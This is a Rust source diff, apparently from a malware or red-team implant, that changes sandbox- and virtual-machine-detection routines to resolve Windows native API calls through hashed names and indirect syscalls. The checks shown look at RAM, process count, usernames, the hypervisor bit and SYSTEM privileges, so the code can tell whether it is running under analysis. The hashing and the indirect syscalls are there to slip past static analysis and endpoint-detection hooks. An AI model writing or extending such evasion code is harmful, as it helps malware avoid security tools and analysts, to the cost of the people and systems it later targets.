@@ -16,9 +16,10 @@ unsafe fn tick_count_ms() -> u64 {
 /// Query total physical RAM (bytes) and processor count via NtQuerySystemInformation on x64.
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn system_basic_info() -> (u64, u32) {
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
+    use crate::resolve::api_hash::h;
     let mut buf = [0u8; 64usize];
-    let st = if let Some((ssn, tramp)) = get_ssn(b"NtQuerySystemInformation") {
+    let st = if let Some((ssn, tramp)) = get_ssn_h(h::NT_QS_INFO) {
         indirect_syscall(ssn, tramp, 0, buf.as_mut_ptr() as usize, 64, 0, 0, 0)
     } else { -1 };
     if st < 0 { return (0, 0); }
@@ -86,8 +87,9 @@ unsafe fn username_is_sandbox() -> bool {
 /// Count processes via NtQuerySystemInformation — no ToolHelp IAT entries on x64.
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn process_count_low() -> bool {
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
-    let Some((ssn, tramp)) = get_ssn(b"NtQuerySystemInformation") else { return false; };
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
+    use crate::resolve::api_hash::h;
+    let Some((ssn, tramp)) = get_ssn_h(h::NT_QS_INFO) else { return false; };
     let mut needed = 0u32;
     let mut dummy = [0u8; 8];
     indirect_syscall(ssn, tramp, 5, dummy.as_mut_ptr() as usize, 8, &mut needed as *mut u32 as usize, 0, 0);
@@ -112,7 +114,8 @@ unsafe fn process_count_low() -> bool {
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
         PROCESSENTRY32W, TH32CS_SNAPPROCESS,
     };
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
+    use crate::resolve::api_hash::h;
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snap == -1isize { return false; }
     let mut entry: PROCESSENTRY32W = core::mem::zeroed();
@@ -122,7 +125,7 @@ unsafe fn process_count_low() -> bool {
         count += 1;
         while Process32NextW(snap, &mut entry) != 0 { count += 1; }
     }
-    if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, snap as usize, 0, 0, 0, 0, 0); }
+    if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, snap as usize, 0, 0, 0, 0, 0); }
     count < 50
 }
 
@@ -142,10 +145,11 @@ unsafe fn hypervisor_bit_set() -> bool {
 
 #[cfg(target_os = "windows")]
 unsafe fn running_as_system() -> bool {
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
+    use crate::resolve::api_hash::h;
 
     // NtOpenProcessToken: (ProcessHandle, DesiredAccess=TOKEN_QUERY=0x8, TokenHandle)
-    let Some((ssn_opt, tramp_opt)) = get_ssn(b"NtOpenProcessToken") else { return false; };
+    let Some((ssn_opt, tramp_opt)) = get_ssn_h(h::NT_OPEN_TOK) else { return false; };
     let mut token_handle: isize = 0;
     let st = indirect_syscall(ssn_opt, tramp_opt,
         usize::MAX, 0x8,
@@ -156,7 +160,7 @@ unsafe fn running_as_system() -> bool {
     let mut buf = vec![0u8; 256];
     let mut return_len = 0u32;
     // NtQueryInformationToken: (TokenHandle, TokenInformationClass=1=TokenUser, Buffer, BufferLength, ReturnLength)
-    let ok = if let Some((ssn_qit, tramp_qit)) = get_ssn(b"NtQueryInformationToken") {
+    let ok = if let Some((ssn_qit, tramp_qit)) = get_ssn_h(h::NT_QI_TOKEN) {
         indirect_syscall(ssn_qit, tramp_qit,
             token_handle as usize, 1,
             buf.as_mut_ptr() as usize,
@@ -164,7 +168,7 @@ unsafe fn running_as_system() -> bool {
             &mut return_len as *mut u32 as usize,
             0)
     } else { -1 };
-    if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, token_handle as usize, 0, 0, 0, 0, 0); }
+    if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, token_handle as usize, 0, 0, 0, 0, 0); }
     if ok < 0 { return false; }
 
     // TOKEN_USER.User.Sid points to a SID. S-1-5-18 (LocalSystem) has:
